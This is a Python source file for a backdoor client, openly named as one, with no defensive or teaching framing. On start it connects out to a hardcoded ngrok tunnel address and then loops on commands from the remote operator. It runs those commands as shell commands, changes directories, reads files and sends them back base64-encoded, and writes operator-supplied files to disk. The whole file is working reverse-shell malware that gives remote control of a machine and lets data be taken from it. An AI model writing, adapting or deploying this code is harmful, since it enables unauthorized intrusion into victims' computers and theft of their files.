import os
import socket
import subprocess
import json
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip
        self.code_type: str

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def codeType(self, title) -> str:
        examples = []
        types_list = ["ascii", "utf-8", "utf-16", "UTF-32", "cp866", "cp1251",
                      "cp1252", "cp1250", "cp437", "cp737", "cp775", "cp852",
                      "cp855", "cp857", "cp860", "cp861", "cp862", "cp863",
                      "cp865", "cp869"]

        for type in types_list:
            try:
                command = f"echo {title}"
                output = subprocess.check_output(command, shell=True)
                output = output.decode(f"{type}")
                out_string = f"{type} -> {output}"
                examples.append(out_string)
            except Exception:
                continue

        return examples

    def reliable_send(self, data):
        if type(data) is not bytes:
            json_data = json.dumps(data)
            json_data = json_data.encode("utf-8")

        else:
            data = data.decode("utf-8")
            json_data = json.dumps(data)
            json_data = json_data.encode("utf-8")

        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        json_data = json_data.decode("utf-8")
        command = json.loads(json_data)
        command = command.split(" ")
        return command

    def deb_log(self, **kwargs):
        for name in kwargs:
            print(f"[D]: {name}", "{", f"\n{kwargs[name]}", "\n}-.")

    def getCodeType(self) -> str:
        title = self.reliable_receive()
        code_type_exmp = self.codeType(title)
        self.reliable_send(code_type_exmp)
        code_type = self.reliable_receive()
        return code_type

    def change_directory_tool(self, path) -> str:
        try:
            if path:
                os.chdir(path)
                return f"[+] Changing working directory to {path}"
        except Exception:
            return "[-] No such file or directory"

    def execute_system_command(self, command) -> str:
        try:
            output = subprocess.check_output(command, shell=True)
            output = output.decode(self.code_type)
            return output

        except subprocess.CalledProcessError:
            self.reliable_send("[-] Unknown command")

    def read_file(self, path):
        with open(path, 'rb')as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def run(self):
        self.code_type = self.getCodeType()
        self.code_type = str(self.code_type[0])

        while True:
            try:
                command = self.reliable_receive()

                if command[0] != "":
                    if command[0] == "exit":
                        self.connection.close()
                        exit()

                    if command[0] == "cd" and len(command) >= 2:
                        command_result = self.change_directory_tool(command[1])

                    if command[0] == "download":
                        command_result = self.read_file(command[1])

                    if command[0] == "upload":
                        command_result = self.write_file(command[1], command[2])

                    else:
                        command_result = self.execute_system_command(command)

                    self.reliable_send(command_result)

            except Exception:
                command_result = "[-] Error during comand execution :Client as Backdoor"
                self.reliable_send(command_result)


if __name__ == "__main__":

    ng_ip = "7.tcp.eu.ngrok.io"
    ng_port = 13825

    backdoor = Backdoor(ip=ng_ip, port=ng_port)
    backdoor.run()
